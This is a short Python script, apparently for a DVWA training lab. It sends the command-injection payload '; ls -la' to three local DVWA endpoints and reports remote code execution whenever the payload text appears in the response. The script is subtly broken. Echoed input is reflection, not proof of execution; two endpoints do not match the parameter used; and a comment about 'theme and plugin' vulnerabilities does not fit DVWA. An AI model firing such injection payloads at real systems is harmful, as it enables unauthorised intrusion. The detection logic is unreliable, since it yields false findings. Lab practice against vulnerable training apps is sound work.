import requests

def rce_test(url, payload):
    session = requests.Session()
    try:
        response = session.get(url, params={'input': payload})

        if payload in response.text:
            print(f"Potential RCE vulnerability detected: {url}")
            print(f"Response content: {response.text[:100]}...")  # Print first 100 characters
        else:
            print(f"No RCE vulnerability detected: {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error occurred while testing {url}: {e}")

if __name__ == "__main__":
    dvwa_url = "http://localhost/DVWA"  # Replace with your DVWA URL
    rce_payload = "; ls -la"

    # Test user input handling
    rce_test(f"{dvwa_url}/vulnerabilities/exec/", rce_payload)

    # Test theme and plugin vulnerability
    rce_test(f"{dvwa_url}/vulnerabilities/upload/", rce_payload)

    # Test direct access to PHP files
    rce_test(f"{dvwa_url}/vulnerabilities/fi/?page=include.php", rce_payload)
